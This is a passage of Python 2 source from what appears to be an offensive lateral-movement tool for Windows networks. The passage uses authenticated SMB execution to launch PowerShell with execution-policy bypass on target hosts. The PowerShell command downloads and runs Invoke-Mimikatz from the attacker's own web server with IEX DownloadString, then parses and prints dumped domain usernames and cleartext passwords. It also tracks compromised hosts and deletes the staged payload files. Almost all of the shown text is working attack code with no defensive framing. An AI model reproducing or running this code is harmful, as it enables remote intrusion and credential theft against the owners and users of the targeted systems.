                                                #command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass \"IEX (New-Object Net.WebClient).DownloadString('http://"+tmpSelectedIP+":8000/download?filepath=C:\windows\\temp\Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\""
                                                command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString('http://"+tmpSelectedIP+":8000/download?filepath=C:\windows\\temp\\"+tmpFilename2+"');Invoke-Mimikatz -DumpCreds\""
                                                if verbose==True:
                                                    print command
                                                complete=False
                                                while complete==False:
                                                    executer = smbexec2.CMDEXEC(tmpusername, tmppassword, tmpdomain, hashes, aesKey, k, dc_ip, mode, share, relayPortNo, command)
                                                    executer.run(targetIP,targetIP)
                                                    results=executer.getOutput()
                                                    if len(str(results))>100:
                                                        tmpList=parseMimikatzOutput(results)
                                                        for x in tmpList:   
                                                            tmpDomain=x[0]
                                                            tmpUsername=x[1]
                                                            tmpPassword=x[2]
                                                            print "\nIP: "+ip+" ("+targetIP+":"+str(relayPortNo)+")"
                                                            print "Domain: "+x[0]   
                                                            print "Username: "+x[1]
                                                            print "Password: "+x[2]
                                                            complete=True
                                                        if ip not in compromisedHostList:
                                                            compromisedHostList.append(ip)
                                                    else:
                                                        print "Sleeping for 3 seconds"
                                                        time.sleep(3)

                                                print "\n"+(setColor("[+]", bold, color="green"))+" Clearing temp files on "+targetIP
                                                #command='cmd /c del C:\\windows\\temp /F /Q' 
                                                #results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                                                #print results
                                                #executer = smbexec.CMDEXEC(tmpusername, tmppassword, tmpdomain, hashes, aesKey, k, dc_ip, mode, share, relayPortNo, command)
                                                #executer.run(targetIP,targetIP)
                                                #if ip in str(results) and results!=None:                            
                                                #    print (setColor("[+]", bold, color="green"))+" Testing credentials against "+ip+(setColor(" [OK]", bold, color="green"))+" ("+tmpdomain+"\\"+tmpusername+"|"+tmppassword+")"
                        finalComplete=True
                else:
                    print (setColor("[-]", bold, color="red"))+" Testing credentials against "+ip+(setColor(" [FAIL]", bold, color="red"))+" ("+tmpdomain+"\\"+tmpusername+"|"+tmppassword+")"
                    #if "nt authority\system" not in str(results) and results!=None:
                    #    print (setColor("[+]", bold, color="green"))+" Testing credentials against "+ip+" [NOT OK] ("+tmpdomain+"\\"+tmpusername+"|"+tmppassword+")"
                    #    os._exit(1)
                finalComplete=True
        os.remove(web_dir+"/"+tmpFilename1)
        os.remove(web_dir+"/"+tmpFilename2)
        os.remove(web_dir+"/"+tmpFilename3)
        os.remove(web_dir+"/"+tmpFilename4)
        os.remove(web_dir+"/"+tmpFilename5)
        os.remove(web_dir+"/"+tmpFilename6)
        print "exit0"
        sys.exit()
        print "exit1"
        os._exit(1)
except  (Exception, KeyboardInterrupt), e:
    logging.critical(str(e))
os._exit(1)



